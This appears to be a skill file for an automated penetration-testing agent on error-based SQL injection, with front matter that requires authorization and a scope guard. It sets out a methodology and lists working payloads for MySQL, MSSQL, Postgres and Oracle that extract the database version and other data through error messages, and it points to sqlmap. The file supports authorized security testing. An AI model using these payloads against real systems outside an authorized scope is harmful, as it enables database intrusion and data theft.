---
name: error-based-sqli
description: >-
  Exploit SQL injection where the DB error text is reflected in the response (CWE-89). Invoke
  when injecting SQL metacharacters yields a database error containing your influence. Extracts
  data by forcing errors that embed query results (extractvalue/updatexml, CAST, CONVERT).
  DBMS dialect (MySQL/MSSQL/PG/Oracle) is selected from a table inside — not separate skills.
family: 04-injection
type: exploit
owasp: [A03:2021]
cwe: [CWE-89]
requires: [scope-guard, tech-fingerprint, evidence-recorder]
authorization: required
---

# Error-Based SQLi

## Invoke when
- Injection produces a reflected DB error you can steer (the error text echoes to the client).

## Prerequisites & oracle
- Oracle = crafted input changes the *error message content* to include controllable/query-derived data.

## Methodology
1. Confirm DBMS from the error signature (fingerprint table below).
2. Break out of the current literal/context (`'`, `"`, `)`, comment tail).
3. Use the dialect's error-exfil primitive to surface `version()`/data in the error.
4. Iterate to enumerate schema → tables → columns → target rows (bounded to PoC).

## Starter payloads (dialect table lives here, not in sibling skills)
- MySQL: `' AND extractvalue(1,concat(0x7e,(SELECT version())))-- -`
- MySQL: `' AND updatexml(1,concat(0x7e,(SELECT database())),1)-- -`
- MSSQL: `' AND 1=CONVERT(int,(SELECT @@version))-- -`
- Postgres: `' AND 1=CAST((SELECT version()) AS int)-- -`
- Oracle: `' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE rownum=1))-- -`

## False-positive filters
- Generic 500 with no controllable content ≠ error-based (may be blind — route to `blind-boolean-sqli`).

## Tooling
- `sqlmap --technique=E` for confirmation/automation once manually proven.

## Chains to
- `union-based-sqli` (bulk extraction), `oob-sqli` (if errors get suppressed), `chain-builder`.
